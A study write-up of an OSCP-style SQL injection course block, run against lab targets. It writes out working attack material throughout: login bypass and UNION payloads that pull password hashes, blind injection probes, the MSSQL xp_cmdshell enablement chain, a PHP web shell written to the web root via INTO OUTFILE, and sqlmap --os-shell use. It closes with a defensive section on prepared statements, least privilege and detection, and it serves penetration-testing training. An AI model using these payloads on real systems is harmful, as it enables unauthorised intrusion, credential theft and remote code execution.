PEN-200 SQLI — SQL Injection Attacks

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-200 (OSCP) course material (modules 35–40, SQL Injection Attacks block) — internal training reference, not for redistribution.

Objective

Move from the web application layer (writeup 04) to its data layer: understand how databases power dynamic apps, inject through parameters to bypass authentication, extract data with UNION-based and blind techniques, and escalate from SQL injection to code execution on the database host — first manually (xp_cmdshell on MSSQL, INTO OUTFILE web shell on MySQL), then automated with sqlmap including --os-shell.

The block's arc, in the course's own order:

  1. Databases in web apps — the request flow through PHP to MySQL, the two layered access levels, and the two DBMSes used in the labs (MySQL and MSSQL).
  2. MySQL — direct CLI access: version/current-user fingerprinting, database/table/user enumeration, the mysql system schema, and authentication storage.
  3. MSSQL — direct CLI access via Impacket's mssqlclient.py (Windows auth), @@version, sys.databases, information_schema.
  4. Error-based injection & authentication bypass — the login form, breaking the query with a quote, ' OR 1=1 --, fingerprinting via version(), dumping credentials one column at a time.
  5. UNION-based extraction — column-count discovery with ORDER BY, type alignment with NULL/function shifting, schema mapping via information_schema, credential harvesting.
  6. Blind injection — Boolean-based (AND 1=1) and time-based (SLEEP/IF) inference, then automation with sqlmap.
  7. Code execution — MSSQL xp_cmdshell enablement chain; MySQL INTO OUTFILE web shell into the web root.
  8. sqlmap end-to-end — fingerprint, --dump, request-file mode (-r), and --os-shell for an interactive command shell.

Target surface

Labs: mountaindesserts.com (Apache/PHP + MySQL — the same static host mapping as earlier blocks; no lab IP is stated in the narration, use your lab gateway's IP) and the SQLite playground ⚠ (ASR; the injection-training web app used for the manual injection exercises, reached by browsing from Kali — despite the name, the demonstrated payloads are MySQL-syntax). Attack box is stock Kali. Direct-CLI exercises run against a local MySQL server and a Windows-based MSSQL server in the lab network (credentials [REDACTED]).

Key facts established across the videos:

  • Two access levels: the direct level (log in as the actual DB user, e.g. root — full DB control) and the indirect level (speak SQL through the web app, which logs in with restricted app credentials). SQL injection operates at the indirect level; direct-level techniques give reference maps for what to look for.
  • The app's PHP backend assembles queries by string concatenation of user input — the root cause of every injection below.
  • The playground app has GET parameters uname and password feeding the login query, plus a customers page with a LIKE '%'-style filter ⚠ parameter.
  • Passwords in the lab tables are stored as MD5 hashes — crackable, making extraction immediately actionable.
  • MySQL 8+ stores hashes as caching_sha2_password ⚠ (per narration; the actual string read from the authentication_string column) in the mysql.user table.

Techniques

The narration describes workflows; commands below are normalized/reconstructed from the described actions (noisy ASR). Items marked ⚠ are ambiguities to re-verify in the lab. All credentials are [REDACTED].

1. MySQL from the command line

mysql -u root -p        # or: mysql -u root -p<password>  (password prompted; [REDACTED])
SELECT version();       # → 8.x  — fingerprint first
SELECT current_user();  # ⚠ narration reads "current user via the system user function" — normalize to current_user()/user()/system_user()
SHOW databases;
USE <db>;
SHOW tables;
SELECT * FROM <table>;

Enumerate the MySQL system database (mysql) — every DBMS ships with metadata databases:

SELECT user, authentication_string FROM mysql.user;   -- account + hash ("caching_sha2_password" ⚠)
-- hashes are stored hashed, not cleartext — crackable offline, not directly usable

2. MSSQL from the command line (Impacket)

impacket-mssqlclient <user>:[REDACTED]@<mssql-server> -windows-auth
# (Kali wrapper for the transcript's "mPacket ms-sql client" — Impacket's mssqlclient.py)

SELECT @@version;                 -- MSSQL fingerprint
SELECT name FROM sys.databases;   -- custom DBs + the four defaults:
                                  -- master, tempdb, model, msdb
USE offsec;                       -- the lab's custom database
SELECT * FROM information_schema.tables;   -- metadata view, equivalent of MySQL's information_schema
SELECT * FROM offsec.dbo.users;            -- "dbo" = database owner default schema
-- → users table with CLEARTEXT passwords (unlike MySQL's hashed storage) — a real-world finding

Cross-DBMS constants to memorize: both expose information_schema; version functions and schema details differ (version() vs @@version, mysql.user vs sys.databases).

3. Error-based injection and authentication bypass

Login queries are the classic injection point — the input is wrapped directly into a SELECT ... WHERE clause.

-- the app's (conceptual) query:
SELECT * FROM users WHERE username='<input1>' AND password='<input2>';

Fingerprint the query shape with a quote: submit ' (URL-encoded %27 when using curl) → SQL syntax error proves injection, and the error text leaks query structure/DBMS. Alternatives in other contexts: quotes are unnecessary in numeric fields — try 1==1 ⚠ (narration; likely 1=1), or 1=1 followed by a quote.

Authentication bypass:

curl "http://mountaindesserts.com/mountaindesterts/?uname=admin%27+OR+1%3D1+--+&password=<anything>"
# ' OR 1=1 --  : the quote closes the input, 1=1 makes WHERE always true,
# -- comments out the rest (the password check and the trailing quote)
# → logged in as the first matching user (the admin account)

The password field no longer matters — the WHERE clause can't fail. Bypass confirms exploitable injection and grants an authenticated session in one step.

Extract data through error messages. Errors print evaluation results, so make the error message carry the data:

curl ".../index.php?uname=%27+OR+1%3D1+OR+version%28%29+%3D+%27...%27+--+&password=x"
# → version() appears in the error message (MySQL 8.x)

Dump one column at a time (error output shows a single column):

' OR 1=1 AND password='<extracted>' --    -- binary-search style: iterate until the error disappears
-- → password column of the admin row, an MD5 hash

⚠ The narration's exact query shape is unclear — the demonstrated idea is: force the target column's value into the error message, adjust, repeat. The same one-column-at-a-time logic powers blind extraction (section 5).

4. UNION-based extraction

UNION is the efficient extraction method: append a second SELECT with matching column count/types.

Find the column count with ORDER BY (numbers sort by column position; anything past the last column errors):

' ORDER BY 1 --    ... 2 ... 3 ... 4 ... 5 --
-- 5 → error ⇒ the query selects 4 columns

Match types with the SELECT list. The first column is an integer ID — a string there breaks the UNION:

' UNION SELECT null, null, null, current_user() --

Shift function calls right past typed columns. Then walk the schema via information_schema:

' UNION SELECT null, table_name, null, null FROM information_schema.tables --
' UNION SELECT null, column_name, null, null FROM information_schema.columns WHERE table_name='users' --
-- finds a password column
' UNION SELECT null, username, password, null FROM users --
-- → usernames + MD5 password hashes → crack the hashes offline

5. Blind injection (Boolean and time-based) → sqlmap

When output or errors don't reflect data, infer one yes/no question per request. The demo parameter defaults to offsec; the page content (e.g. displayed information) changes depending on whether the WHERE clause matched.

Boolean-based — compare responses to a known-true and a known-false condition:

curl "http://<playground>/index.php?user=offsec' AND 1=1 -- "   # normal page
curl "http://<playground>/index.php?user=offsec' AND 1=2 -- "   # blank/different page
# response diff = an oracle; script it to extract data bit by bit

Time-based — when the page is identical either way, use latency as the oracle:

offsec' AND IF(<condition>, SLEEP(3), 0) --
-- 3-second delay on TRUE conditions = a slow but reliable oracle

Automate with sqlmap (boilerplate gone, but check every "automated" result):

sqlmap -u "http://<playground>/index.php?user=offsec" -p user
# → detects the time-based blind payload; DBMS fingerprinted

6. Manual code execution

MSSQL: xp_cmdshell. Disabled by default; the enablement is a three-step chain needing admin rights:

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
-- → command output as the SQL service account

⚠ The narration's exact chain ("check whether it's enabled with the correct function, then enable it") is summarized above per standard MSSQL procedure — verify the exact statements in the lab. A direct path to a Windows shell; ⚠ the narration hints at following up toward an interactive reverse shell via cmd/PowerShell.

MySQL: SELECT ... INTO OUTFILE. Write query output — a PHP web shell — into a web-servable folder:

SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/webshell.php';

Requirements: the target folder must be writable by the MySQL process, and MySQL must be permitted to write files (secure-file-priv permitting ⚠ — not stated in the narration). Then:

curl "http://mountaindesserts.com/webshell.php?cmd=ls"
# → output; commands run as the web server user (www-data)

⚠ On stock MySQL 8, INTO OUTFILE into a fresh file is blocked by secure-file-priv and existing files can't be overwritten — treat the demo as the ideal case and test in your lab.

7. sqlmap end-to-end

sqlmap automates the whole chain — fingerprinting, extraction, and code execution. Verify every finding manually (avoid over-reliance on automation).

sqlmap -u "http://<playground>/index.php?user=offsec" -p user
# → time-based blind detected, DBMS fingerprinted
sqlmap -u "..." -p user --dump
# → table contents incl. credentials (slow over time-based blind — [REDACTED] in the demo)

Request-file mode (much more reliable for authenticated/POST forms — hands sqlmap the exact request):

  1. Send the login request through Burp once.
  2. Right-click → Copy to file → save as sqlmap.txt.
  3. sqlmap -r sqlmap.txt -p <parameter> — sqlmap replays the request with cookies intact.

--os-shell — interactive command execution through the same INTO OUTFILE web-shell technique:

sqlmap -r sqlmap.txt -p item --os-shell
# → sqlmap asks for a writable web folder, uploads its shell, gives an interactive prompt
# → whoami / systeminfo: commands as www-data

Detection & defense

Defensive readings of each technique:

  • Never concatenate input into SQL. Parameterized queries / prepared statements are the fix for every technique in this writeup — the injection itself (quote fingerprint, ' OR 1=1, UNION, blind) all die at the prepared-statement boundary. This is the single highest-leverage control.
  • Error hygiene. Detailed DBMS errors are an oracle: they confirm injection, leak query structure, and carried the error-based extraction. Log errors server-side; return generic messages client-side.
  • Least privilege for the app's DB user. The ' OR 1=1 bypass succeeded against the admin account and UNION read other tables because the app user could. Restrict the app account to its own schema, revoke file-write (FILE) and xp_cmdshell-relevant privileges, and never run the app as DB admin — the INTO OUTFILE web shell and xp_cmdshell chain both required exactly that.
  • Hash, don't store, credentials — and not MD5. The demo's cleartext (MSSQL) and MD5 (playground) passwords made extraction immediately weaponizable; use salted, memory-hard hashes (bcrypt/Argon2) so a dump still isn't an account list.
  • Blind injection needs no output. Parameter filtering alone can't stop Boolean/time-based oracles — only parameterized queries do. Network-side, alert on request bursts against a single parameter (blind automation is chatty), anomalous SLEEP-like latencies, and UNION/information_schema strings in parameters (WAF rules for common payloads, accepting they are bypassable).
  • sqlmap's --os-shell is INTO OUTFILE + a writable web root — lock down secure-file-priv, keep the web root non-writable by the DB service account, and monitor for unexpected .php files appearing in it.
  • Monitoring angle: single quotes and comment sequences (--) in parameters, information_schema/UNION SELECT in request bodies, sequential ORDER BY N probes, and MSSQL sp_configure/RECONFIGURE in the DB audit log are high-signal, cheap detections.
